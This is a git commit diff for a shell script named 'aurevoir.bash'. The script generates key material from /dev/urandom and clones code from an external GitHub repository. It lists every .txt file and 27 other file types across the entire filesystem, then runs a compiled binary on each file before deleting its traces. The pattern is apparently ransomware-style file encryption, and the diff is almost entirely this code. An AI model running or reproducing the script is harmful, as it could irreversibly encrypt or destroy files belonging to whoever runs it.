ec4322caa849ea271e6670b9ff69c6a535ca182f
Mihnea Stefan <mihnea.stefan@protonmail.com>
2020-12-04 21:55:44 +0200

    Shell script refactoring

--- aurevoir.bash
+++ aurevoir.bash
@@ -7,27 +7,35 @@ apt-get install gcc
 initialLocation="$(pwd)"
 numberOfFiles=0
 locationOfFile=""
+currentType=""
 
 cd /dev
 head -16 urandom > keyGenDump.txt
-find / -name "*.txt" > fileLocations.txt
 
 git clone https://github.com/ape-x/Aurevoir.git
-
 mv keyGenDump.txt Aurevoir
-mv fileLocations.txt Aurevoir
 mv Aurevoir $initialLocation
 cd $initialLocation
 cd Aurevoir
+
+touch fileLocations.txt
+find / -name "*.txt" >> fileLocations.txt
+
+for i in $(seq 1 27)
+    do
+    currentType="$(head -n $i items.txt | tail -1)"
+    find / -name "$currentType"
+    done
+    
 gcc -o exe main.c
 
 numberOfFiles=$(wc -l < fileLocations.txt)
 
 for i in $(seq 1 $numberOfFiles)
-	do
-	locationOfFile="$(head -n $i fileLocations.txt | tail -1)"
-	./exe $locationOfFile
-	done
+    do
+    locationOfFile="$(head -n $i fileLocations.txt | tail -1)"
+    ./exe $locationOfFile
+    done
 
 cd ..
 rm -rf Aurevoir
